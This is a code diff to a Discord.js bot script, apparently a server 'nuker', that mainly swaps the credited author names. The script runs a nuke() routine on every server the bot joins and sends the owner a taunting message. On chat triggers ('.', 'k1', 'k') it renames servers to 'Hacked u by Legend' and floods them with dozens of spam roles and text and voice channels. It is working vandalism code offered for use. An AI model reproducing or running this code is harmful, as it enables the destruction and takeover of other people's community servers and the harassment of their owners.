@@ -1,6 +1,6 @@
 const Discord = require("discord.js");
 const LOka = new Discord.Client();
-console.log('By LEGEND-YT');
+console.log('By KBOOOOOOOOSH-YT');
 LOka.on('ready', () => {
   console.log(`Logged in as ${LOka.user.tag} !`);
  
@@ -8,10 +8,10 @@ LOka.on('ready', () => {
 LOka.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('      ~            ~  By : LEGND-YT ~           ~    ');
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  LEGEND-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
  
        
    
@@ -40,13 +40,13 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/461211380272594944/4
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u by LEGND-YT")
+LOka.user.setUsername("Hacked u by Legend")
  
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked u by Legend`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u LEGND-YT`)
+             m.setName(`Hacked u by Legend`)
 })
 }
 });
@@ -81,201 +81,197 @@ LOka.on('message', message => {
      if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "Hacked u LEGND-YT",
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by LEGND-YT",
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by LEGND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-m.createRole({
-        name : "Hacked u by LEGEND-YT",
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by LEGEND-YT",
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked u by LEGEND-YT",
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by LEGEND-YT",
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
+    })
+     m.createRole({
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by LEGEND-YT",
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked u by LEGEND-YT",
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u LEGEND-YT",
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by LEGND-YT",
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Legend",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -290,52 +286,52 @@ m.createRole({
 LOka.on('message', message => {
          if (message.content === "k") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
  
-m.createChannel('Hacked u by LEGND-YT', 'text');
-
-m.createChannel('Hacked u by LEGND-YT', 'text');
-
-m.createChannel('Hacked u by LEGND-YT', 'text');
+m.createChannel('hacked by legend', 'text');
  
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
+m.createChannel('hacked by legend', 'text');
  
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
+m.createChannel('hacked by legend', 'text');
  
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
  
-m.createChannel('Hacked u by LEGND-YT', 'text');
-m.createChannel('Hacked u by LEGND-YT', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+ 
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
+ 
+m.createChannel('hacked by legend', 'text');
+m.createChannel('hacked by legend', 'text');
  
 })
 }
@@ -344,64 +340,65 @@ m.createChannel('Hacked u by LEGND-YT', 'text');
 LOka.on('message', message => {
          if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
  
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
  
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
  
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
  
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
-m.createChannel('Hacked u by LEGND-YT ', 'voice');
+m.createChannel('Hacked u by LEGEND', 'voice');
+m.createChannel('Hacked u by LEGEND', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+ 
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by LEGEND', 'voice');
+m.createChannel('Hacked u by LEGEND', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by LEGEND', 'voice');
+m.createChannel('Hacked u by LEGEND', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by LEGEND', 'voice');
+m.createChannel('Hacked u by LEGEND', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('Hacked u by LEGEND', 'voice');
+m.createChannel('Hacked u by LEGEND', 'voice');
+m.createChannel('Hacked u by Legend', 'voice');
  
  
  
@@ -420,7 +417,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked u by LEGND-YT Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
  
  
  
@@ -439,9 +436,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked u by LEGND-YT', 'text');
+    await guild.createChannel('Hacked u by Legend', 'text');
  
-      await guild.createChannel('Hacked u LEGND-YT', 'voice');
+      await guild.createChannel('Hacked u by Legend', 'voice');
  
  
  
@@ -451,7 +448,7 @@ LOka.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("Made by LEGND-YT");
+  console.log("Made by YzhF1");
   console.log("");
   console.log("-------------------------------------------------------------");
  
